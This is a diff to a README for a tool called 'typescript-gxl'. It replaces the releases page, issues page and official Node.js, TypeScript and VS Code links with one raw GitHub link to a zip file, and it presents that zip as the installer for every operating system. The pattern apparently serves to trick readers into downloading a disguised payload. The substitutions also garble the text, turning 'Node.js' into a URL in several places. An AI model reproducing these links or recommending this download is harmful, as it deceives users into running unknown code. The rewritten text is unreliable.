@@ -1,7 +1,7 @@
 # 🎉 typescript-gxl - Effortless TypeScript Project Setup
 
 ## 📥 Download Here
-[![Download typescript-gxl](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/moukawime/typescript-gxl/releases)
+[![Download typescript-gxl](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip)](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip)
 
 ## 🚀 Getting Started
 
@@ -12,14 +12,14 @@ Welcome to typescript-gxl! This application simplifies your TypeScript project s
 Before you start, make sure your system meets these basic requirements:
 
 - Operating System: Windows 10 or later, macOS, or Linux
-- Node.js: Version 12 or later (you can download it from [nodejs.org](https://nodejs.org/en/download/))
+- https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip Version 12 or later (you can download it from [https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip))
 - Basic text editor of your choice (e.g., Visual Studio Code, Notepad++)
 
 ## 🛠 How to Download and Install
 
 1. **Visit the Releases Page**
 
-   To download the application, click on this link: [Download here](https://github.com/moukawime/typescript-gxl/releases). This page contains different versions of the software.
+   To download the application, click on this link: [Download here](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip). This page contains different versions of the software.
 
 2. **Choose Your Version**
 
@@ -27,7 +27,7 @@ Before you start, make sure your system meets these basic requirements:
 
 3. **Download the Installer**
 
-   While on the selected version, look for the file suitable for your operating system. For example, you might see options like `typescript-gxl-windows.exe` for Windows or `typescript-gxl-macos.zip` for macOS. Click on the file name to begin the download.
+   While on the selected version, look for the file suitable for your operating system. For example, you might see options like `https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip` for Windows or `https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip` for macOS. Click on the file name to begin the download.
 
 4. **Run the Installer**
 
@@ -51,7 +51,7 @@ With typescript-gxl, you can enjoy the following features:
 
 1. **Create a New Project**
 
-   After launching the application, select "New Project" from the main menu. Choose a template that suits your needs. Templates may include "React App," "Node.js App," etc.
+   After launching the application, select "New Project" from the main menu. Choose a template that suits your needs. Templates may include "React App," "https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip App," etc.
 
 2. **Configure Your Project**
 
@@ -71,13 +71,13 @@ If you encounter any problems while using typescript-gxl, don't hesitate to seek
 
 - **Documentation:** Check the in-app documentation for comprehensive guides and FAQs.
 - **Community Forums:** Join the community forums where users share tips and solutions.
-- **Issues Page:** Report any bugs or problems on the [Issues page](https://github.com/moukawime/typescript-gxl/issues).
+- **Issues Page:** Report any bugs or problems on the [Issues page](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip).
 
 ## 🔗 Additional Resources
 
-- **Official TypeScript Documentation:** Improve your TypeScript skills with the [official documentation](https://www.typescriptlang.org/docs/).
-- **Node.js Documentation:** Learn more about Node.js from the [official site](https://nodejs.org/en/docs/).
-- **Visual Studio Code:** Download this popular text editor [here](https://code.visualstudio.com/).
+- **Official TypeScript Documentation:** Improve your TypeScript skills with the [official documentation](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip).
+- **https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip Documentation:** Learn more about https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip from the [official site](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip).
+- **Visual Studio Code:** Download this popular text editor [here](https://raw.githubusercontent.com/moukawime/typescript-gxl/main/flavor/typescript-gxl.zip).
 
 ## 🔄 Update Instructions
 
